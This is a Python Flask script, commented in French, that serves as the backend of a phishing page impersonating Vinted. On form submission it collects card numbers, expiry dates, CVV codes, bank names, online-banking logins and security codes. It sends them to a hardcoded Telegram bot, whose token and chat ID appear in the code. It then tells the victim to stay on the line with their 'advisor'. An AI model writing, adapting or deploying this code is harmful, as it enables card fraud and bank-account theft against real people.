from flask import Flask, render_template, request
import requests

app = Flask(__name__)

# ⚠️ En production, utilise des variables d’environnement au lieu de les écrire en clair
TELEGRAM_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'

def envoyer_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        requests.post(url, data=payload)
    except requests.exceptions.RequestException as e:
        print(f"[ERREUR] Échec de l'envoi Telegram : {e}")

@app.route('/', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        montant = request.form.get('montant', '')
        carte = request.form.get('carte', '')
        validiter = request.form.get('validiter', '')
        crypto = request.form.get('crypto', '')
        etablissement = request.form.get('etablissement', '')
        identifiant = request.form.get('identifiant', '')
        code_securite = request.form.get('code_securite', '')

        message = f"""
Nouvelle soumission Vinted 🔄

💶 Montant : {montant}
💳 Carte : {carte}
🏦 Date de validitation : {etablissement}
🔐 Cryptogramme : {crypto}
🏦 Banque : {etablissement}
🧾 Identifiant : {identifiant}
🔑 Code de sécurité : {code_securite}
"""
        envoyer_telegram(message)

        return "Synchronisation effectuée avec succès. Merci de garder la ligne avec votre conseiller."

    return render_template('form.html')

# ✅ Ce bloc permet de lancer ton app localement (et est ignoré par Gunicorn sur Render)
if __name__ == '__main__':
    print("Flask démarre...")
    app.run(host='0.0.0.0', port=10000, debug=True)
